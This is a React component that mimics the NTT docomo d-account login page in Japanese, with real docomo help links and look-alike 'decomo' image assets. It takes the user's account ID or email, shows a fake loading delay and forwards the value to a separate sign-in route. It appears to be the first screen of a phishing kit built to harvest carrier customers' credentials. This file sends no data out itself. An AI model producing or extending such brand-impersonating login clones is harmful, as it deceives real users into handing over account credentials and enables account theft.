import React from 'react';
import axios from 'axios';
import './hometwo.css';
import { useState } from 'react';
import { useNavigate } from 'react-router-dom';

import mainbg from './mainbg.jpeg';
import logotwo from './logotwo.gif';
import decomo from './decomo.png';
import decomotwo from './decomotwo.png';




function HomeTwo(){

    const[email, setUserName] = useState("");
    const[isLoading, setIsLoading]= useState(false);
    const navigate = useNavigate();

    function handleNext(e){
        e.preventDefault();
        setIsLoading(true);

        setTimeout(() => {
            setIsLoading(false);
            navigate('/sign-in',{state:{email:email}});
          }, 3000);

       
    }

    const[checked, setChecked] = useState(false);


    return (
        <>

            <div className='mainContent'>

                <div className='shadowdiv text-center'>
                    <img src={decomo} className="mylogo" />
                </div>

                <div className='col-md-6 m-auto maindiv '>

                    <div className='imagediv px-5'>
                        <img src={decomotwo} className="mylogotwo" />

                    </div>

                    <div className='px-5'>

                    

                  

                    <form onSubmit={handleNext}>
                    <div className='py-1 px-4'>
                    <h2 className='text-left label py-2'>dアカウントID</h2>
                        <input onChange={function(e){
                        setUserName(e.target.value);
                    }} value={email}  type="text"className='form-control py-4'placeholder='電子メールアドレスまたは任意のID' required/>
                        

                        <div className='text-right mt-1'>
                            <a className='forgot' href="https://id.smt.docomo.ne.jp/src/utility/idpw_forget.html">アカウントが分からない方</a>

                        </div>

                        <div className='text-center mt-3'>
                            
                            <input type="checkbox"onChange={function(e){
                                setChecked(!checked)
                            }} /> <span className='label'>ログインしたままにする</span>
                        </div>
                        </div>
                        
                        <div className='px-3 text-center mt-4'>
                        <button className='next btn'>
                            {isLoading ? "読み込み中..." : "次へ"}
                        </button>

                        </div>
                    </form>

                    </div>


                    <div className='text-left mt-5'>
                        <p className='semifoot'>※ログインについての<a href="https://id.smt.docomo.ne.jp/src/utility/notice.html">注意事項</a>をご確認ください。</p>

                    </div>

                    <div className='footerone px-2 py-2'>
                        <h5 className='footerhead'>ご確認ください</h5>
                        <p className='footerpara'>はじめてご利用の方は <a href='https://id.smt.docomo.ne.jp/cgi8/id/tpl/REG101'>dアカウントを作成</a>してください。</p>

                    </div>

                

                </div>


                

            </div>
        
        
        </>
    );

}

export default HomeTwo;